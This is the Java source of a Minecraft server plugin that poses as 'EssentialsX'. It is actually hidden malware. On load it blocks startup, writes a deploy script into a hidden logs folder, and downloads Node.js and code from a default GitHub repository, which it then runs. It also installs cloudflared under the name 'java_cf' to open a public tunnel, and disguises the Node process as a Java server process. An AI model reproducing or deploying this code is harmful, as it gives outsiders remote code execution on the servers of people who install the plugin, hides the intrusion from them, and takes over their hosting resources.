package com.example.essentialsx;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.ProcessBuilder.Redirect;
import java.net.HttpURLConnection;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.bukkit.plugin.java.JavaPlugin;

public class EssentialsX extends JavaPlugin {
   private Process deployProcess;
   private volatile Process nodeProcess = null;
   private volatile Process cfProcess = null;
   private volatile boolean isProcessRunning = false;
   private volatile String nodePort = "N/A";
   private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);

   public EssentialsX() {
   }

   private String allocateNodePort() {
      int port = 20000 + new Random().nextInt(40000);

      try (ServerSocket socket = new ServerSocket(port)) {
         socket.setReuseAddress(true);
         String portStr = String.valueOf(port);
         Path portFile = Paths.get("logs", ".mcchajian", ".tunnel_port");
         Files.createDirectories(portFile.getParent());
         Files.writeString(portFile, portStr);
         this.nodePort = portStr;
         return portStr;
      } catch (IOException e) {
         return this.allocateNodePort();
      }
   }

   private void waitForNodeReady(String port, int maxSeconds) {
      int waited = 0;

      while (waited < maxSeconds) {
         try {
            label40: {
               try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
                  try {
                     HttpURLConnection conn = (HttpURLConnection)URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
                     conn.setRequestMethod("HEAD");
                     conn.setConnectTimeout(1000);
                     conn.setReadTimeout(1000);
                     int code = conn.getResponseCode();
                     conn.disconnect();
                  } catch (Exception var9) {
                     break label40;
                  }
               }

               return;
            }
         } catch (IOException var11) {
         }

         try {
            Thread.sleep(1000L);
            waited++;
         } catch (InterruptedException ignored) {
            return;
         }
      }
   }

   private void startNodeProcess(String port) {
      try {
         Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
         Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
         Path script = botDir.resolve("app/index.js");
         Path logFile = botDir.resolve("app.log");
         Path preload = botDir.resolve(".nd_preload.js");
         if (!Files.exists(nodeExe) || !Files.exists(script)) {
            return;
         }

         nodeExe.toFile().setExecutable(true, false);
         ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
         pb.directory(botDir.toFile());
         pb.environment().put("SERVER_PORT", port);
         pb.environment().put("PORT", port);
         pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
         pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
         pb.environment().put("HOME", botDir.toString());
         pb.redirectOutput(Redirect.appendTo(logFile.toFile()));
         pb.redirectError(Redirect.appendTo(logFile.toFile()));
         this.nodeProcess = pb.start();

         try {
            this.nodeProcess.getOutputStream().close();
         } catch (Exception var9) {
         }
      } catch (Exception var10) {
      }
   }

   private void killProcessTree(Process process) {
      if (process != null) {
         try {
            List<ProcessHandle> descendants = new ArrayList<>();
            process.toHandle().descendants().forEach(descendants::add);

            for (int i = descendants.size() - 1; i >= 0; i--) {
               try {
                  descendants.get(i).destroyForcibly();
               } catch (Exception var6) {
               }
            }

            process.destroyForcibly();

            try {
               process.waitFor(3L, TimeUnit.SECONDS);
            } catch (Exception var5) {
            }
         } catch (Exception var7) {
         }
      }
   }

   private void startCfProcess() {
      try {
         Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
         Path cfBin = botDir.resolve("jre21/bin/java_cf");
         Path cfConf = botDir.resolve("jre21/conf/server.properties");
         Path cfLog = botDir.resolve("cf.log");
         if (!Files.exists(cfBin)) {
            return;
         }

         cfBin.toFile().setExecutable(true, false);

         try {
            Files.writeString(cfLog, "");
         } catch (Exception var8) {
         }

         Files.createDirectories(cfConf.getParent());
         Files.writeString(cfConf, "url: http://127.0.0.1:" + this.nodePort + "\nno-autoupdate: true\nprotocol: quic\n");
         ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
         pb.directory(botDir.toFile());
         pb.redirectOutput(Redirect.appendTo(cfLog.toFile()));
         pb.redirectError(Redirect.appendTo(cfLog.toFile()));
         this.cfProcess = pb.start();

         try {
            this.cfProcess.getOutputStream().close();
         } catch (Exception var7) {
         }
      } catch (Exception var9) {
      }
   }

   private String extractLatestTunnelUrl() {
      try {
         Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
         if (Files.exists(cfLog)) {
            String logContent = Files.readString(cfLog);
            Matcher m = Pattern.compile("(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)").matcher(logContent);
            String lastMatch = null;

            while (m.find()) {
               lastMatch = m.group(1);
            }

            if (lastMatch != null) {
               return lastMatch;
            }
         }
      } catch (Exception var5) {
      }

      return null;
   }

   private void startJavaDaemon() {
      Thread daemon = new Thread(() -> {
         String lastUrl = "";

         while (true) {
            try {
               if (this.nodeProcess == null || !this.nodeProcess.isAlive()) {
                  if (this.nodeProcess != null) {
                     this.killProcessTree(this.nodeProcess);
                  }

                  String newPort = this.allocateNodePort();
                  this.startNodeProcess(newPort);
                  this.waitForNodeReady(newPort, 60);
                  if (this.cfProcess != null) {
                     this.killProcessTree(this.cfProcess);
                  }

                  this.startCfProcess();
                  lastUrl = "";
               }

               if (this.cfProcess == null || !this.cfProcess.isAlive()) {
                  if (this.cfProcess != null) {
                     this.killProcessTree(this.cfProcess);
                  }

                  this.startCfProcess();
                  lastUrl = "";
               }

               String foundUrl = this.extractLatestTunnelUrl();
               if (foundUrl != null && !foundUrl.equals(lastUrl)) {
                  lastUrl = foundUrl;
                  RAW_OUT.println("\n====================================================================");
                  RAW_OUT.println("  [Tunnel Active] " + foundUrl);
                  RAW_OUT.println("====================================================================\n");
               }

               Thread.sleep(5000L);
            } catch (Exception var3) {
            }
         }
      }, "Backend-Daemon");
      daemon.setDaemon(true);
      daemon.start();
   }

   public void onEnable() {
      try {
         Path oldDir1 = Paths.get("world", "data", ".mcchajian");
         Path oldDir2 = Paths.get("log", ".mcchajian");
         if (Files.exists(oldDir1)) {
            this.deleteDirectory(oldDir1.toFile());
         }

         if (Files.exists(oldDir2)) {
            this.deleteDirectory(oldDir2.toFile());
         }
      } catch (Exception var4) {
      }

      this.getLogger().info("Blocking server startup, initializing tunnel...");
      Thread deployThread = new Thread(() -> {
         try {
            HashMap<String, String> env = new HashMap<>();
            this.loadEnvFile(env);
            this.startDeploymentProcess(env);
            String port = this.allocateNodePort();
            this.startNodeProcess(port);
            this.waitForNodeReady(port, 60);
            this.startCfProcess();
            this.startJavaDaemon();
         } catch (Exception var3x) {
         }
      }, "Backend-Deployer");
      deployThread.setDaemon(true);
      deployThread.start();

      try {
         Thread.currentThread().join();
      } catch (InterruptedException var3) {
      }
   }

   public void onDisable() {
      if (this.nodeProcess != null) {
         this.killProcessTree(this.nodeProcess);
      }

      if (this.cfProcess != null) {
         this.killProcessTree(this.cfProcess);
      }

      if (this.deployProcess != null) {
         this.killProcessTree(this.deployProcess);
      }
   }

   private void startDeploymentProcess(Map<String, String> env) throws Exception {
      if (!this.isProcessRunning) {
         Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
         if (!Files.exists(workDir)) {
            Files.createDirectories(workDir);
         }

         try {
            workDir.toFile().setReadable(true, false);
            workDir.toFile().setWritable(true, false);
            workDir.toFile().setExecutable(true, false);
         } catch (Exception var7) {
         }

         Path scriptPath = workDir.resolve("deploy.sh");
         String scriptContent = this.generateDeployScript(workDir.toString(), env);
         Files.write(scriptPath, scriptContent.getBytes());
         scriptPath.toFile().setExecutable(true, false);
         ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
         pb.directory(new File(".").getAbsoluteFile());
         pb.environment().putAll(env);
         pb.redirectOutput(Redirect.INHERIT);
         pb.redirectError(Redirect.INHERIT);
         this.deployProcess = pb.start();
         this.isProcessRunning = true;
         new Thread(() -> {
            try {
               this.deployProcess.waitFor();
               this.isProcessRunning = false;
            } catch (Exception var2x) {
            }
         }).start();
         Path doneFile = workDir.resolve(".deploy_done");

         while (!Files.exists(doneFile)) {
            Thread.sleep(1000L);
         }
      }
   }

   private String generateDeployScript(String workDir, Map<String, String> env) {
      String repoUrl = env.getOrDefault("REPO_URL", "");
      String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
      String nodeDir = workDir + "/nodejs";
      String appDir = workDir + "/app";
      String authHeader = "";
      if (!githubToken.isEmpty()) {
         authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";
      }

      return "#!/bin/bash\nset +e\nWORK_DIR=\""
         + workDir
         + "\"\nNODE_DIR=\""
         + nodeDir
         + "\"\nAPP_DIR=\""
         + appDir
         + "\"\nREPO_URL=\""
         + repoUrl
         + "\"\nJRE_DIR=\"$WORK_DIR/jre21/bin\"\nexport HOME=\"$WORK_DIR\"\numask 0002\n\nif [ -z \"$REPO_URL\" ]; then echo \"ERROR: REPO_URL is not configured\"; exit 1; fi\n\nARCH=$(uname -m)\nif [ $ARCH = x86_64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz; CF_ARCH=amd64\nelif [ $ARCH = aarch64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz; CF_ARCH=arm64; fi\n\nmkdir -p \"$WORK_DIR\" \"$JRE_DIR\" \"$APP_DIR\"\nchmod -R 775 \"$WORK_DIR\" 2>/dev/null\n\nif [ ! -f \"$NODE_DIR/bin/.node_real\" ]; then\n    rm -rf \"$NODE_DIR\"; NODE_DOWNLOAD_OK=false\n    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; break; fi; fi; done\n    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n        mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 --no-same-owner 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n        cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"; fi\nfi\nexport PATH=\"$NODE_DIR/bin:$PATH\"\n\nrm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\nREPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\nTAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"; DOWNLOAD_OK=false\n"
         + (
            githubToken.isEmpty()
               ? ""
               : "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \""
                  + githubToken
                  + "\" ]; then\n    if curl -fsSL --connect-timeout 15 --max-time 120 "
                  + authHeader
                  + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n"
         )
         + "\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n\nif [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n\nmkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\nSUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\nmv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\n\n\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >/dev/null 2>&1\nif [ $? -ne 0 ]; then \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps >/dev/null 2>&1; fi\n\nmkdir -p \"$JRE_DIR\" 2>/dev/null\ncp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"\n\ncat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\ntry { process.title = 'java -Xms128M -Xmx2560M -jar server.jar'; var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n    _cp.spawn = function(cmd, args, opts) { if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) { opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; cmd = _wrapper; } return _origSpawn.call(this, cmd, args, opts); };\n    _cp.fork = function(mod, args, opts) { opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; return _origFork.call(this, mod, args, opts); }; } catch(e) {}\nPRELOAD_EOF\nchmod 664 \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\nexport _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\nexport NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n\nCF_BIN=\"$JRE_DIR/java_cf\"; mkdir -p \"$JRE_DIR\" 2>/dev/null\nif [ ! -f \"$CF_BIN\" ]; then\n    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then\n            if [ -f \"$CF_BIN\" ] && [ -s \"$CF_BIN\" ]; then chmod 775 \"$CF_BIN\"; break; fi; fi; done; fi\n\necho \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
   }

   private void loadEnvFile(Map<String, String> env) {
      Path envFile = Paths.get("logs", ".mcchajian", ".env");
      if (!Files.exists(envFile)) {
         try {
            Files.createDirectories(envFile.getParent());
            String defaultConfig = "SYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/gongzhongc\n";
            Files.write(envFile, defaultConfig.getBytes());
         } catch (Exception var6) {
         }
      }

      if (Files.exists(envFile)) {
         try {
            for (String line : Files.readAllLines(envFile)) {
               String[] parts;
               if (!line.isEmpty() && !line.startsWith("#") && (parts = line.split("=", 2)).length == 2) {
                  env.put(parts[0].trim(), parts[1].trim());
               }
            }
         } catch (IOException var7) {
         }
      }
   }

   private void deleteDirectory(File file) {
      File[] files = file.listFiles();
      if (files != null) {
         for (File f : files) {
            if (f.isDirectory()) {
               this.deleteDirectory(f);
            } else {
               f.delete();
            }
         }
      }

      file.delete();
   }
}
